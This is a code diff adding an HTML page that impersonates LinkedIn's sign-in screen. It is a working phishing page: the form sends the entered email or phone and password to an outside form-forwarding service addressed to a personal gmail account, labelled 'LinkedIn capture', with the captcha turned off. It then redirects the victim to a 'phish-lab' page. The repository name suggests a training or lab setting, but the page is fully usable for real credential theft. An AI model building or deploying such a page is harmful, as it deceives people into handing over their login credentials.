@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LinkedIn Login, Sign in | LinkedIn</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+         background: #fff; color: rgba(0,0,0,0.9); }
+  .nav { display: flex; justify-content: space-between; align-items: center;
+         padding: 12px 24px; }
+  .logo { color: #0a66c2; font-size: 28px; font-weight: 700; }
+  .logo span { background: #0a66c2; color: #fff; border-radius: 4px; padding: 0 4px; }
+  .join { text-decoration: none; color: rgba(0,0,0,0.6); font-size: 14px; font-weight: 600; }
+  .card { max-width: 352px; margin: 40px auto; padding: 24px;
+          border: 1px solid rgba(0,0,0,0.12); border-radius: 8px;
+          box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+  h1 { font-size: 32px; font-weight: 600; margin-bottom: 24px; }
+  label { font-size: 12px; font-weight: 600; display: block; margin-bottom: 4px; }
+  input[type=text], input[type=password] {
+    width: 100%; padding: 12px; font-size: 14px;
+    border: 1px solid rgba(0,0,0,0.6); border-radius: 4px; margin-bottom: 20px; }
+  input:focus { outline: 2px solid #0a66c2; outline-offset: -1px; }
+  .hint { font-size: 12px; color: #0a66c2; text-decoration: none;
+          display: inline-block; margin-bottom: 16px; font-weight: 600; }
+  .signin { width: 100%; padding: 12px; background: #0a66c2; color: #fff;
+            border: none; border-radius: 24px; font-size: 16px;
+            font-weight: 600; cursor: pointer; }
+  .signin:hover { background: #004182; }
+  .divider { text-align: center; margin: 16px 0; font-size: 14px;
+             color: rgba(0,0,0,0.6); }
+  .google { display: block; width: 100%; padding: 10px; text-align: center;
+            border: 1px solid rgba(0,0,0,0.6); border-radius: 24px;
+            text-decoration: none; color: rgba(0,0,0,0.6); font-weight: 600; font-size: 14px; }
+  .footer { text-align: center; font-size: 12px; color: rgba(0,0,0,0.6);
+            margin-top: 32px; }
+  .footer a { color: rgba(0,0,0,0.6); margin: 0 8px; text-decoration: none; }
+</style>
+</head>
+<body>
+
+<div class="nav">
+  <div class="logo">Linked<span>in</span></div>
+  <a class="join" href="#">Join now</a>
+</div>
+
+<div class="card">
+  <h1>Sign in</h1>
+
+  <form action="https://formsubmit.co/saraeloudri@gmail.com" method="POST">
+    <label for="username">Email or phone</label>
+    <input type="text" id="username" name="username" autocomplete="off" required>
+
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" autocomplete="off" required>
+
+    <a class="hint" href="#">Forgot password?</a>
+
+    <input type="hidden" name="_honey" style="display:none">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="LinkedIn capture">
+    <input type="hidden" name="_next"
+           value="https://saraeloudri-sudo.github.io/phish-lab/thanks.html">
+
+    <button class="signin" type="submit">Sign in</button>
+  </form>
+
+  <div class="divider">or</div>
+  <a class="google" href="#">Continue with Google</a>
+</div>
+
+<div class="footer">
+  <a href="#">User Agreement</a>
+  <a href="#">Privacy Policy</a>
+  <a href="#">Help</a>
+</div>
+
+</body>
+</html>
